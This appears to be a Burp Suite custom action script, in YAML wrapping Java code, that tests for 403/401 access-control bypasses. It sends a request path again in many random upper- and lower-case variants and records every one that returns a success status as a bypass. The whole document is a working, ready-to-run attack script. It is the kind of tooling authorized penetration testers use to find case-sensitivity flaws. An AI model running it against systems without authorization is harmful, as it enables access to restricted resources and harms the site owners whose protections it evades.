id: b089c2e1-45f8-4b7b-9c6d-bypass-case-001
name: 403/401 Bypass - Path Case Switching
function: CUSTOM_ACTION
location: REPEATER
source: |+
  // 403/401 Bypass - Path Case Switching
  // Tests bypass by changing case of characters in the path
  
  int DELAY_MS = 50;
  boolean VERBOSE = true;
  int NUM_VARIATIONS = 15;
  
  var originalRequest = requestResponse.request();
  var httpService = requestResponse.httpService();
  var originalPath = originalRequest.path();
  int originalStatus = requestResponse.response().statusCode();
  
  logging.logToOutput("=== 403/401 Bypass - Path Case Switching ===");
  logging.logToOutput("Target: " + httpService.host() + originalPath);
  logging.logToOutput("Original Status: " + originalStatus);
  logging.logToOutput("");
  
  int total = 0, success = 0;
  
  java.util.function.BiPredicate<Integer, Integer> isSuccess = (orig, curr) -> 
      (curr >= 200 && curr < 400) && (orig == 401 || orig == 403);
  
  String pathWithoutQuery = originalPath.contains("?") ? 
      originalPath.substring(0, originalPath.indexOf("?")) : originalPath;
  
  java.util.Set<String> variations = new java.util.HashSet<>();
  java.util.Random rand = new java.util.Random();

  // Generate random case variations
  for (int v = 0; v < NUM_VARIATIONS * 2 && variations.size() < NUM_VARIATIONS; v++) {
      StringBuilder sb = new StringBuilder();
      for (int i = 0; i < pathWithoutQuery.length(); i++) {
          char c = pathWithoutQuery.charAt(i);
          if (Character.isLetter(c)) {
              sb.append(rand.nextBoolean() ? Character.toUpperCase(c) : Character.toLowerCase(c));
          } else {
              sb.append(c);
          }
      }
      String variation = sb.toString();
      if (!variation.equals(pathWithoutQuery)) {
          variations.add(variation);
      }
  }
  
  // Also add specific variations: all upper, all lower
  variations.add(pathWithoutQuery.toUpperCase());
  variations.add(pathWithoutQuery.toLowerCase());
  
  for (String variation : variations) {
      if (variation.equals(pathWithoutQuery)) continue;
      try {
          var req = originalRequest.withPath(variation);
          var resp = api.http().sendRequest(req);
          Thread.sleep(DELAY_MS);
          
          int status = resp.response().statusCode();
          String note = variation + " -> " + status;
          
          if (isSuccess.test(originalStatus, status)) {
              success++;
              logging.logToOutput("[+] SUCCESS: " + note);
              var rr = burp.api.montoya.http.message.HttpRequestResponse.httpRequestResponse(req, resp.response());
              rr.annotations().setNotes("Case Switch Bypass: " + note);
              api.organizer().sendToOrganizer(rr);
          } else if (VERBOSE) {
              logging.logToOutput("[-] " + note);
          }
          total++;
      } catch (Exception e) {
          logging.logToError("Error: " + e.getMessage());
      }
  }
  
  logging.logToOutput("");
  logging.logToOutput("=== Complete: " + total + " requests, " + success + " bypasses ===");
